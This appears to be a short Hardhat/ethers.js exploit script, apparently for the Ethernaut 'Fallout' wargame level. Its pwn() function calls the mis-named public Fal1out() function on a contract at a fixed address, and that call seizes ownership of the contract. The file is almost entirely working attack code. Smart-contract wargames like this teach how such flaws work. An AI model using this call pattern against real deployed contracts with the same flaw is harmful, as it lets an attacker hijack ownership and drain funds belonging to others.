import { ethers } from "hardhat"
console.log("imports")
//contract instance (addy, abi, signer)
//call Fal1out() method

async function pwn () {
    const signer = (await ethers.getSigners())[0]
    const target = "0x4C5D5835885cB3C765041cfD4AacE93E52179c1b"
    const abi = ["function Fal1out()"]
    const contract = new ethers.Contract(
        target,
        abi,
        signer
    )
    try {
        const tx = await contract.Fal1out()
        console.log(await tx.wait())
    } catch (e) {
        console.log(e)
    }
}

pwn()
